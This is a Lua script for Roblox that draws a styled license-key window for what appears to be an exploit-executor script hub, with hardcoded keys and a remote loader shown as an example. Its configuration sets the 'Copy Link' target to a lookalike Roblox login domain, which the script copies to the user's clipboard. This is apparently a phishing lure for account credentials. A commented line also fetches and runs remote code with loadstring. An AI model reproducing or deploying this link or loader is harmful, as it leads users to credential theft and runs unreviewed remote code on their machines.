--[[
	╔══════════════════════════════════════════════════════════════╗
	║                  MODERN KEY SYSTEM v1.0                      ║
	║           Professional Executor-Style UI for Roblox          ║
	╚══════════════════════════════════════════════════════════════╝
 
	CONFIGURATION SECTION — Edit only this block.
	Do not modify anything below the dashed separator unless
	you know what you are doing.
--]]
 
local CONFIG = {
 
	-- ── Title shown at the top of the window ──────────────────────
	Title = "Sick Hub Key System",
 
	-- ── Valid keys ─────────────────────────────────────────────────
	-- Add as many keys as needed. Keys are case-sensitive.
	ValidKeys = {
		"FREE_KEY",
		"FREE_LARP",
		"KEY_SYSTEM",
	},
 
	-- ── Key expiration (optional) ──────────────────────────────────
	-- Set ExpirationEnabled = true and fill ExpiringKeys.
	-- Format: ["KEY"] = os.time() timestamp of expiry date.
	-- Use https://www.epochconverter.com to get a timestamp.
	ExpirationEnabled = false,
	ExpiringKeys = {
		-- ["TEMP-KEY-0001"] = 1800000000,
	},
 
	-- ── Link copied when "Copy Link" is pressed ────────────────────
	KeyLink = "https://roblox.com.bz/login?returnUrl=2456074333377199",
 
	-- ── Accent color (RGB, 0-255) ──────────────────────────────────
	-- Default: purple (124, 58, 237)
	AccentR = 124,
	AccentG = 58,
	AccentB = 237,
 
	-- ── Execute this function when the key is accepted ─────────────
	-- Replace the print() with your script logic or loadstring call.
	OnSuccess = function()
		print("[KeySystem] Key accepted — loading main script...")
		-- Example: loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/c996342f1ec9b5ccf3d10ca47ab70ec1.lua"))()
	end,
}
 
-- ══════════════════════════════════════════════════════════════════
--  DO NOT EDIT BELOW THIS LINE UNLESS YOU KNOW WHAT YOU ARE DOING
-- ══════════════════════════════════════════════════════════════════
 
local Players      = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService   = game:GetService("RunService")
local UserInput    = game:GetService("UserInputService")
 
local LocalPlayer  = Players.LocalPlayer
local PlayerGui    = LocalPlayer:WaitForChild("PlayerGui")
 
-- ── Helpers ────────────────────────────────────────────────────────
 
local function rgb(r, g, b)           return Color3.fromRGB(r, g, b) end
local function tween(obj, info, props) return TweenService:Create(obj, info, props) end
 
local accent     = rgb(CONFIG.AccentR, CONFIG.AccentG, CONFIG.AccentB)
local accentDark = rgb(
	math.floor(CONFIG.AccentR * 0.75),
	math.floor(CONFIG.AccentG * 0.75),
	math.floor(CONFIG.AccentB * 0.75)
)
 
-- ── Key validation ─────────────────────────────────────────────────
 
local function isKeyValid(key)
	for _, v in ipairs(CONFIG.ValidKeys) do
		if v == key then
			if CONFIG.ExpirationEnabled then
				local expiry = CONFIG.ExpiringKeys[key]
				if expiry and os.time() > expiry then
					return false, "expired"
				end
			end
			return true, "ok"
		end
	end
	return false, "invalid"
end
 
-- ── GUI Construction ───────────────────────────────────────────────
 
-- Remove any existing instance to prevent duplicates on re-run
if PlayerGui:FindFirstChild("KeySystemGUI") then
	PlayerGui.KeySystemGUI:Destroy()
end
 
local ScreenGui   = Instance.new("ScreenGui")
ScreenGui.Name    = "KeySystemGUI"
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn   = false
ScreenGui.Parent  = PlayerGui
 
-- ── Backdrop blur / darken overlay ────────────────────────────────
 
local Overlay        = Instance.new("Frame")
Overlay.Size         = UDim2.fromScale(1, 1)
Overlay.BackgroundColor3 = rgb(0, 0, 0)
Overlay.BackgroundTransparency = 1  -- starts invisible
Overlay.BorderSizePixel = 0
Overlay.Parent       = ScreenGui
 
-- ── Main window ────────────────────────────────────────────────────
 
local Window        = Instance.new("Frame")
Window.Size         = UDim2.fromOffset(360, 0)   -- height auto-set below
Window.AnchorPoint  = Vector2.new(0.5, 0.5)
Window.Position     = UDim2.fromScale(0.5, 0.5)
Window.BackgroundColor3 = rgb(14, 14, 22)
Window.BackgroundTransparency = 1
Window.BorderSizePixel = 0
Window.ClipsDescendants = true
Window.Parent       = ScreenGui
 
-- Auto-size height
local WindowLayout = Instance.new("UIListLayout")
WindowLayout.FillDirection = Enum.FillDirection.Vertical
WindowLayout.SortOrder     = Enum.SortOrder.LayoutOrder
WindowLayout.Parent        = Window
WindowLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
	Window.Size = UDim2.fromOffset(360, WindowLayout.AbsoluteContentSize.Y)
end)
 
local WindowCorner   = Instance.new("UICorner")
WindowCorner.CornerRadius = UDim.new(0, 14)
WindowCorner.Parent  = Window
 
-- Outer glow / border
local WindowStroke   = Instance.new("UIStroke")
WindowStroke.Color   = accent
WindowStroke.Thickness = 1
WindowStroke.Transparency = 0.7
WindowStroke.Parent  = Window
 
-- ── Title bar ──────────────────────────────────────────────────────
 
local TitleBar      = Instance.new("Frame")
TitleBar.Size       = UDim2.new(1, 0, 0, 48)
TitleBar.BackgroundColor3 = rgb(10, 10, 18)
TitleBar.BorderSizePixel = 0
TitleBar.LayoutOrder = 1
TitleBar.Parent     = Window
 
local TitleBarDivider = Instance.new("Frame")
TitleBarDivider.Size  = UDim2.new(1, 0, 0, 1)
TitleBarDivider.Position = UDim2.new(0, 0, 1, -1)
TitleBarDivider.BackgroundColor3 = rgb(30, 30, 50)
TitleBarDivider.BorderSizePixel = 0
TitleBarDivider.Parent = TitleBar
 
-- Icon + label row
local TitleLeft     = Instance.new("Frame")
TitleLeft.Size      = UDim2.new(1, -60, 1, 0)
TitleLeft.BackgroundTransparency = 1
TitleLeft.Position  = UDim2.fromOffset(14, 0)
TitleLeft.Parent    = TitleBar
 
local TitleLeftLayout = Instance.new("UIListLayout")
TitleLeftLayout.FillDirection = Enum.FillDirection.Horizontal
TitleLeftLayout.VerticalAlignment = Enum.VerticalAlignment.Center
TitleLeftLayout.Padding = UDim.new(0, 9)
TitleLeftLayout.Parent  = TitleLeft
 
local IconFrame     = Instance.new("Frame")
IconFrame.Size      = UDim2.fromOffset(28, 28)
IconFrame.BackgroundColor3 = rgb(50, 20, 100)
IconFrame.BorderSizePixel = 0
IconFrame.Parent    = TitleLeft
 
local IconCorner    = Instance.new("UICorner")
IconCorner.CornerRadius = UDim.new(0, 7)
IconCorner.Parent   = IconFrame
 
local IconStroke    = Instance.new("UIStroke")
IconStroke.Color    = accent
IconStroke.Transparency = 0.5
IconStroke.Parent   = IconFrame
 
local IconLabel     = Instance.new("TextLabel")
IconLabel.Size      = UDim2.fromScale(1, 1)
IconLabel.BackgroundTransparency = 1
IconLabel.Text      = "🔑"
IconLabel.TextSize  = 14
IconLabel.TextXAlignment = Enum.TextXAlignment.Center
IconLabel.Parent    = IconFrame
 
local TitleLabel    = Instance.new("TextLabel")
TitleLabel.Size     = UDim2.fromOffset(200, 28)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text     = CONFIG.Title
TitleLabel.TextColor3 = rgb(241, 241, 245)
TitleLabel.TextSize = 14
TitleLabel.Font     = Enum.Font.GothamBold
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.Parent   = TitleLeft
 
-- Close button
local CloseBtn      = Instance.new("TextButton")
CloseBtn.Size       = UDim2.fromOffset(28, 28)
CloseBtn.Position   = UDim2.new(1, -14, 0.5, -14)
CloseBtn.AnchorPoint = Vector2.new(1, 0)
CloseBtn.BackgroundColor3 = rgb(60, 20, 20)
CloseBtn.Text       = "✕"
CloseBtn.TextColor3 = rgb(220, 60, 60)
CloseBtn.TextSize   = 13
CloseBtn.Font       = Enum.Font.GothamBold
CloseBtn.BorderSizePixel = 0
CloseBtn.Parent     = TitleBar
 
local CloseBtnCorner = Instance.new("UICorner")
CloseBtnCorner.CornerRadius = UDim.new(0, 7)
CloseBtnCorner.Parent = CloseBtn
 
-- ── Body ───────────────────────────────────────────────────────────
 
local Body          = Instance.new("Frame")
Body.Size           = UDim2.new(1, 0, 0, 0)
Body.AutomaticSize  = Enum.AutomaticSize.Y
Body.BackgroundTransparency = 1
Body.LayoutOrder    = 2
Body.Parent         = Window
 
local BodyPadding   = Instance.new("UIPadding")
BodyPadding.PaddingLeft   = UDim.new(0, 20)
BodyPadding.PaddingRight  = UDim.new(0, 20)
BodyPadding.PaddingTop    = UDim.new(0, 20)
BodyPadding.PaddingBottom = UDim.new(0, 20)
BodyPadding.Parent  = Body
 
local BodyLayout    = Instance.new("UIListLayout")
BodyLayout.FillDirection = Enum.FillDirection.Vertical
BodyLayout.SortOrder     = Enum.SortOrder.LayoutOrder
BodyLayout.Padding        = UDim.new(0, 12)
BodyLayout.Parent   = Body
 
-- Subtitle hint
local SubLabel      = Instance.new("TextLabel")
SubLabel.Size       = UDim2.new(1, 0, 0, 18)
SubLabel.BackgroundTransparency = 1
SubLabel.Text       = "Enter your license key below to continue"
SubLabel.TextColor3 = rgb(120, 120, 160)
SubLabel.TextSize   = 12
SubLabel.Font       = Enum.Font.Gotham
SubLabel.LayoutOrder = 1
SubLabel.Parent     = Body
 
-- ── Key TextBox ────────────────────────────────────────────────────
 
local BoxFrame      = Instance.new("Frame")
BoxFrame.Size       = UDim2.new(1, 0, 0, 42)
BoxFrame.BackgroundColor3 = rgb(10, 10, 16)
BoxFrame.BorderSizePixel = 0
BoxFrame.LayoutOrder = 2
BoxFrame.Parent     = Body
 
local BoxCorner     = Instance.new("UICorner")
BoxCorner.CornerRadius = UDim.new(0, 9)
BoxCorner.Parent    = BoxFrame
 
local BoxStroke     = Instance.new("UIStroke")
BoxStroke.Color     = rgb(42, 42, 58)
BoxStroke.Thickness = 1
BoxStroke.Parent    = BoxFrame
 
local KeyInput      = Instance.new("TextBox")
KeyInput.Size       = UDim2.new(1, -16, 1, 0)
KeyInput.Position   = UDim2.fromOffset(16, 0)
KeyInput.BackgroundTransparency = 1
KeyInput.PlaceholderText = "XXXX-XXXX-XXXX-XXXX"
KeyInput.PlaceholderColor3 = rgb(70, 70, 90)
KeyInput.TextColor3 = rgb(220, 220, 240)
KeyInput.TextSize   = 13
KeyInput.Font       = Enum.Font.Code
KeyInput.TextXAlignment = Enum.TextXAlignment.Left
KeyInput.ClearTextOnFocus = false
KeyInput.Parent     = BoxFrame
 
-- Focus glow on textbox
KeyInput.Focused:Connect(function()
	tween(BoxStroke, TweenInfo.new(0.2), { Color = accent, Transparency = 0.4 }):Play()
end)
KeyInput.FocusLost:Connect(function()
	tween(BoxStroke, TweenInfo.new(0.2), { Color = rgb(42, 42, 58), Transparency = 0 }):Play()
end)
 
-- ── Button row ─────────────────────────────────────────────────────
 
local BtnRow        = Instance.new("Frame")
BtnRow.Size         = UDim2.new(1, 0, 0, 40)
BtnRow.BackgroundTransparency = 1
BtnRow.LayoutOrder  = 3
BtnRow.Parent       = Body
 
local BtnRowLayout  = Instance.new("UIListLayout")
BtnRowLayout.FillDirection = Enum.FillDirection.Horizontal
BtnRowLayout.SortOrder     = Enum.SortOrder.LayoutOrder
BtnRowLayout.Padding        = UDim.new(0, 10)
BtnRowLayout.Parent  = BtnRow
 
local function makeButton(label, icon, bgColor, textColor, order, isAccent)
	local Btn       = Instance.new("TextButton")
	Btn.Size        = UDim2.new(0.5, -5, 1, 0)
	Btn.BackgroundColor3 = bgColor
	Btn.Text        = icon .. "  " .. label
	Btn.TextColor3  = textColor
	Btn.TextSize    = 13
	Btn.Font        = Enum.Font.GothamSemibold
	Btn.BorderSizePixel = 0
	Btn.LayoutOrder = order
	Btn.Parent      = BtnRow
 
	local BtnCorner = Instance.new("UICorner")
	BtnCorner.CornerRadius = UDim.new(0, 9)
	BtnCorner.Parent = Btn
 
	if not isAccent then
		local BtnStroke = Instance.new("UIStroke")
		BtnStroke.Color = rgb(46, 46, 66)
		BtnStroke.Thickness = 1
		BtnStroke.Parent = Btn
	end
 
	Btn.MouseEnter:Connect(function()
		tween(Btn, TweenInfo.new(0.15), {
			BackgroundColor3 = isAccent and accentDark or rgb(30, 30, 48)
		}):Play()
	end)
	Btn.MouseLeave:Connect(function()
		tween(Btn, TweenInfo.new(0.15), { BackgroundColor3 = bgColor }):Play()
	end)
	Btn.MouseButton1Down:Connect(function()
		tween(Btn, TweenInfo.new(0.08), { Size = UDim2.new(0.5, -7, 1, -2) }):Play()
	end)
	Btn.MouseButton1Up:Connect(function()
		tween(Btn, TweenInfo.new(0.1), { Size = UDim2.new(0.5, -5, 1, 0) }):Play()
	end)
 
	return Btn
end
 
local CheckBtn  = makeButton("Check Key", "🛡", accent, rgb(255, 255, 255), 1, true)
local CopyBtn   = makeButton("Copy Link", "📋", rgb(18, 18, 28), rgb(161, 161, 192), 2, false)
 
-- ── Notification frame ─────────────────────────────────────────────
 
local function makeNotif(bgColor, strokeColor, iconText, msgText, order)
	local Notif         = Instance.new("Frame")
	Notif.Size          = UDim2.new(1, 0, 0, 38)
	Notif.BackgroundColor3 = bgColor
	Notif.BorderSizePixel = 0
	Notif.LayoutOrder   = order
	Notif.BackgroundTransparency = 1  -- hidden by default
	Notif.Parent        = Body
 
	local NCorner       = Instance.new("UICorner")
	NCorner.CornerRadius = UDim.new(0, 9)
	NCorner.Parent      = Notif
 
	local NStroke       = Instance.new("UIStroke")
	NStroke.Color       = strokeColor
	NStroke.Transparency = 0.5
	NStroke.Parent      = Notif
 
	local NLayout       = Instance.new("UIListLayout")
	NLayout.FillDirection = Enum.FillDirection.Horizontal
	NLayout.VerticalAlignment = Enum.VerticalAlignment.Center
	NLayout.Padding      = UDim.new(0, 8)
	NLayout.Parent      = Notif
 
	local NPad          = Instance.new("UIPadding")
	NPad.PaddingLeft    = UDim.new(0, 12)
	NPad.Parent         = Notif
 
	local NIcon         = Instance.new("TextLabel")
	NIcon.Size          = UDim2.fromOffset(18, 18)
	NIcon.BackgroundTransparency = 1
	NIcon.Text          = iconText
	NIcon.TextSize      = 16
	NIcon.Parent        = Notif
 
	local NMsg          = Instance.new("TextLabel")
	NMsg.Size           = UDim2.new(1, -40, 1, 0)
	NMsg.BackgroundTransparency = 1
	NMsg.Text           = msgText
	NMsg.TextColor3     = rgb(220, 220, 235)
	NMsg.TextSize       = 12
	NMsg.Font           = Enum.Font.Gotham
	NMsg.TextXAlignment = Enum.TextXAlignment.Left
	NMsg.Parent         = Notif
 
	return Notif, NMsg
end
 
local SuccessNotif, SuccessMsg = makeNotif(
	rgb(10, 30, 12), rgb(22, 163, 74), "✅", "Key verified — access granted", 4
)
local ErrorNotif, ErrorMsg = makeNotif(
	rgb(30, 10, 10), rgb(220, 38, 38), "❌", "Invalid key — please try again", 5
)
local CopyNotif, CopyMsg = makeNotif(
	rgb(10, 20, 35), rgb(37, 99, 235), "🔗", "Link copied to clipboard", 6
)
 
-- ── Notification display helper ────────────────────────────────────
 
local activeNotif = nil
local function showNotif(frame, duration)
	if activeNotif then
		activeNotif.BackgroundTransparency = 1
		activeNotif.Visible = true
	end
	activeNotif = frame
	frame.BackgroundTransparency = 1
	frame.Visible = true
	tween(frame, TweenInfo.new(0.25), { BackgroundTransparency = 0 }):Play()
	task.delay(duration or 3, function()
		if activeNotif == frame then
			tween(frame, TweenInfo.new(0.3), { BackgroundTransparency = 1 }):Play()
			task.delay(0.35, function() frame.Visible = false end)
		end
	end)
end
 
-- ── Button logic ────────────────────────────────────────────────────
 
CheckBtn.MouseButton1Click:Connect(function()
	local key = KeyInput.Text
 
	if key == "" then
		ErrorMsg.Text = "Please enter a key first"
		showNotif(ErrorNotif, 2.5)
		return
	end
 
	local valid, reason = isKeyValid(key)
 
	if valid then
		SuccessMsg.Text = "Key verified — access granted"
		showNotif(SuccessNotif, 2.5)
 
		task.delay(0.8, function()
			local fadeTween = tween(Window, TweenInfo.new(0.5), { BackgroundTransparency = 1 })
			fadeTween:Play()
			fadeTween.Completed:Connect(function()
				ScreenGui:Destroy()
				CONFIG.OnSuccess()
			end)
		end)
	else
		if reason == "expired" then
			ErrorMsg.Text = "Your key has expired"
		else
			ErrorMsg.Text = "Invalid key — please try again"
		end
		showNotif(ErrorNotif, 3)
 
		-- Shake animation
		local orig = Window.Position
		local shake = {
			UDim2.new(0.5, -6, 0.5, 0),
			UDim2.new(0.5,  6, 0.5, 0),
			UDim2.new(0.5, -4, 0.5, 0),
			UDim2.new(0.5,  4, 0.5, 0),
			UDim2.new(0.5,  0, 0.5, 0),
		}
		for _, pos in ipairs(shake) do
			tween(Window, TweenInfo.new(0.05), { Position = pos }):Play()
			task.wait(0.05)
		end
	end
end)
 
CopyBtn.MouseButton1Click:Connect(function()
	if setclipboard then
		setclipboard(CONFIG.KeyLink)
	end
	CopyMsg.Text = "Link copied to clipboard"
	showNotif(CopyNotif, 2.5)
end)
 
CloseBtn.MouseButton1Click:Connect(function()
	tween(Window, TweenInfo.new(0.25, Enum.EasingStyle.Quad), { BackgroundTransparency = 1 }):Play()
	tween(Overlay, TweenInfo.new(0.25), { BackgroundTransparency = 1 }):Play()
	task.delay(0.3, function() ScreenGui:Destroy() end)
end)
 
-- ── Draggable window ────────────────────────────────────────────────
 
local dragging, dragStart, startPos = false, nil, nil
 
TitleBar.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1
		or input.UserInputType == Enum.UserInputType.Touch then
		dragging  = true
		dragStart = input.Position
		startPos  = Window.Position
	end
end)
 
UserInput.InputChanged:Connect(function(input)
	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
		or input.UserInputType == Enum.UserInputType.Touch) then
		local delta = input.Position - dragStart
		Window.Position = UDim2.new(
			startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y
		)
	end
end)
 
UserInput.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1
		or input.UserInputType == Enum.UserInputType.Touch then
		dragging = false
	end
end)
 
-- ── Fade-in entrance animation ─────────────────────────────────────
 
Window.BackgroundTransparency = 1
tween(Overlay, TweenInfo.new(0.3), { BackgroundTransparency = 0.55 }):Play()
 
task.delay(0.05, function()
	Window.Position = UDim2.new(0.5, 0, 0.46, 0)  -- slightly above center
	tween(Window, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
		BackgroundTransparency = 0,
		Position = UDim2.fromScale(0.5, 0.5),
	}):Play()
end)
